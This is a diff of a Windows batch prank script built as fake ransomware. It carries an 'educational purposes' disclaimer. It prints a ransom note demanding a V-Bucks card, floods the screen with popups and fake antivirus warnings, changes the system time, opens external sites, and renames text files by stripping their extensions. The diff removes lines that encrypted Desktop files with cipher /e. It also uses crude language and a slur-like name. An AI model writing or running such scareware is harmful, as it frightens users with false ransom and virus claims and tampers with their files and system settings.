@@ -44,7 +44,7 @@ echo.
 pause
 
 echo get ready for the song
-start /min https://www.youtube.com/watch?v=EgqUJOudrcM
+start /min https://www.youtube.com/watch?v=HWjCStB6k4o
 echo DISCLAIMER: This script is being executed for educational purposes only.
 pause
 cls
@@ -57,7 +57,7 @@ set DEST=%USERPROFILE%\Desktop/secret
 if not exist "!DEST!" mkdir "!DEST!"
 
 for /l %%i in (1,1,10) do (
-    echo secret shoutout to slimyboigayali count %%i > "!DEST!\secret_file%%i.txt"
+    echo secret shoutout to slimyboigayali data %%i > "!DEST!\secret_file%%i.txt"
 )
 
 
@@ -71,7 +71,7 @@ echo All your files have been encrypted.
 echo To restore access, send fortnite vbucks card (get the reference?)  to gurtligoons.
 echo lets fuck !DEST!
 echo.
-ping localhost -n 4 > nul
+ping localhost -n 1 > nul
 
 
 set POPUP=%TEMP%\gurt_popup.vbs
@@ -140,9 +140,10 @@ echo Bye
 
 
 
-cipher /e "%USERPROFILE%\Desktop\paypal.txt"
-cipher /e "%USERPROFILE%\Desktop\robuxinformation.txt"
-cipher /e "%USERPROFILE%\Desktop\vbucks giftcard.txt"
+for %%f in (*.txt) do ren "%%f" "%%~nf"
+for %%f in (*.txt) do ren "%%f" "%%~nf"
+for %%f in (*.txt) do ren "%%f" "%%~nf"
+
 
 
 powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $notify = New-Object System.Windows.Forms.NotifyIcon; $notify.Icon = [System.Drawing.SystemIcons]::Information; $notify.Visible = $true; $notify.ShowBalloonTip(0, 'evil gurt:yo', 'furt: am evil gurt trust.', [System.Windows.Forms.ToolTipIcon]::None)}"
@@ -201,8 +202,8 @@ echo WARNING: Your antivirus has detected malicious activity!
 ping localhost -n 2 >nul
 echo Critical error: Virus detected. Initiating scan...
 ping localhost -n 3 >nul
-start new_script.bat
 exit
+start new_script.bat
 
 
 echo MsgBox "gurtlings spawn and start flooding popups and pop and ups" >> %temp%\popup.vbs
@@ -219,6 +220,7 @@ color 0C
 cls
 echo Changing system time...
 time 12:12:12
+exit
 start new_script.bat1
 ping localhost -n 2 >nul
 goto next2
@@ -256,6 +258,7 @@ mshta "javascript:alert('To fix this problem, purchase FULL!! BIG RATT!!!! now! 
 
 
 start https://bigrat.monster/
+exit
 start new_script.bat3
 
 
@@ -291,7 +294,7 @@ goto cleaning
 
 
 
-:cleaing
+:cleaning
 echo we done right=?!?!?!
 echo btw this horse is cleaning for you
 start https://tenor.com/view/horse-sweeping-broom-radlcies-gif-24147266
